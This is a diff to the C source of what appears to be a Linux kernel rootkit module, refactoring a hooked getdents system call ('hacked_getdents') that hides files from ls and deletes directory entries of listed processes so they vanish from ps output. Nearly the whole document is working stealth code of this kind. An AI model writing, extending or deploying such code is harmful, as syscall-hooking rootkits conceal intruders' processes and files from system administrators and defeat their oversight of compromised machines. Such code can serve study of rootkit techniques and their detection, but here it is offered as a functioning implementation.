@@ -139,98 +139,122 @@ error:
     goto cleanup;
 }
 
-asmlinkage long hacked_getdents(unsigned int fd,
-				struct linux_dirent *dirp,
-				unsigned int count)
+int is_command_ps(unsigned int fd)
 {
-    unsigned int dent_offset = 0;
-    long getdents_ret;
-    int error;
-    size_t dir_name_len;
-    struct linux_dirent *cur_dirent, *next_dirent;
     struct file *fd_file;
     struct inode *fd_inode;
-    struct pid *pid;
+
+    fd_file = fcheck(fd);
+    if (unlikely(!fd_file)) {
+        return 0;
+    }
+    fd_inode = file_inode(fd_file);
+    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
+        && iminor(fd_inode) == 0)
+    {
+        DEBUG("User typed command ps");
+        return 1;
+    }
+    return 0;
+}
+
+int is_hidden_process(char *proc_name)
+{
+    int i;
+    for (i = 0; i < sizeof(HIDDEN_PROCESSES) / sizeof(char *); i++)
+    {
+        // Hidden process is found
+        // if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
+        if (strstr(proc_name, HIDDEN_PROCESSES[i]) != NULL && strstr(HIDDEN_PROCESSES[i], proc_name) != NULL)
+        {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+long hide_processes(struct linux_dirent *dirp, long getdents_ret)
+{
+    unsigned int dent_offset;
+    struct linux_dirent *cur_dirent, *next_dirent;
+    char *proc_name, *dir_name;
+    char *dirent_ptr = (char *)dirp;
+    int error;
+    size_t dir_name_len;
+    pid_t pid_num;
     struct task_struct *proc_task;
-    char *proc_name, *dirent_ptr = (char *)dirp, *dir_name;
+    struct pid *pid;
+
+    // getdents_ret is number of bytes read
+    for (dent_offset = 0; dent_offset < getdents_ret;)
+    {
+        cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
+        dir_name = cur_dirent->d_name;
+        dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
+        error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
+        if (error < 0)
+        {
+            goto next_getdent;
+        }
+        pid = find_get_pid(pid_num);
+        if (!pid)
+        {
+            goto next_getdent;
+        }
+        proc_task = get_pid_task(pid, PIDTYPE_PID);
+        if (!proc_task)
+        {
+            goto next_getdent;
+        }
+        proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
+        if (!proc_name)
+        {
+            goto next_getdent;
+        }
+        proc_name = get_task_comm(proc_name, proc_task);
+        if (is_hidden_process(proc_name)) {
+            // Hide the process by deleting its dirent: shift all its right dirents to left.
+            printk("Hide process: %s\n", proc_task->comm);
+            next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
+            memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
+            getdents_ret -= cur_dirent->d_reclen;
+            // To cancel dent_offset += cur_dirent->d_reclen at the end of for loop.
+            dent_offset -= cur_dirent->d_reclen;
+        }
+        kfree(proc_name);
+    next_getdent:
+        dent_offset += cur_dirent->d_reclen;
+    }
+    return getdents_ret;
+}
+
+long handle_ps(unsigned int fd, struct linux_dirent *dirp, long getdents_ret)
+{
     struct files_struct *open_files = current->files;
     int is_ps = 0;
-    pid_t pid_num;
-    //DEBUG("Entering hacked getdents");
+    spin_lock(&open_files->file_lock);
+    is_ps = is_command_ps(fd);
+    if (is_ps != 0) {
+        getdents_ret = hide_processes(dirp, getdents_ret);
+    }
+    spin_unlock(&open_files->file_lock);
+    return getdents_ret;
+}
+
+asmlinkage long hacked_getdents(unsigned int fd,
+                struct linux_dirent *dirp,
+                unsigned int count)
+{
+    long getdents_ret;
     // Call original getdents system call.
     getdents_ret = (*orig_getdents)(fd, dirp, count);
 
     // Entry point into hiding files function
     getdents_ret = handle_ls(dirp, getdents_ret);
 
-    spin_lock(&open_files->file_lock);
-    fd_file = fcheck(fd);
-    if (unlikely(!fd_file)) {
-        goto exit_unlock;
-    }
-    fd_inode = file_inode(fd_file);
-    //printk("fd_inode->i_ino: %lu", fd_inode->i_ino);
-    //printk("MAJOR->MAJOR: %i", imajor(fd_inode));
-    //printk("MINOR->MINOR: %i", iminor(fd_inode));
-    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
-        && iminor(fd_inode) == 0)
-    {
-        DEBUG("User typed command ps");
-        is_ps = 1;
-    }
+    // Entry point into hiding processes function
+    getdents_ret = handle_ps(fd, dirp, getdents_ret);
 
-    if (is_ps != 0) {
-        // getdents_ret is number of bytes read
-        for (dent_offset = 0; dent_offset < getdents_ret;)
-        {
-            cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
-            dir_name = cur_dirent->d_name;
-            dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
-            error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
-            if (error < 0)
-            {
-                goto next_getdent;
-            }
-            pid = find_get_pid(pid_num);
-            if (!pid)
-            {
-                goto next_getdent;
-            }
-            printk("proc_task%p\n", pid);
-            proc_task = get_pid_task(pid, PIDTYPE_PID);
-            printk("proc_task%p\n", proc_task);
-            if (!proc_task)
-            {
-                goto next_getdent;
-            }
-            proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
-            if (!proc_name)
-            {
-                goto next_getdent;
-            }
-            proc_name = get_task_comm(proc_name, proc_task);
-            if (strncmp(proc_name, HIDDEN_PROCESS, strlen(HIDDEN_PROCESS)) == 0)
-            {
-                // Hide the process by deleting its dirent: shift all its right dirents to left.
-                printk("%s work needs to be done to hide", HIDDEN_PROCESS);
-                next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
-                memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
-                getdents_ret -= cur_dirent->d_reclen;
-                dent_offset -= cur_dirent->d_reclen;
-            }
-            // goto exit_unlock;
-            printk("dir_name:%s\n", dir_name);
-            printk("proc_name%s\n", proc_name);
-            printk("pid_num:%i\n", pid_num);
-            kfree(proc_name);
-        next_getdent:
-            dent_offset += cur_dirent->d_reclen;
-        }
-        DEBUG("Exiting ps filter");
-    }
-exit_unlock:
-    //DEBUG("Exiting hacked getdents");
-    spin_unlock(&open_files->file_lock);
     return getdents_ret;
 }
 
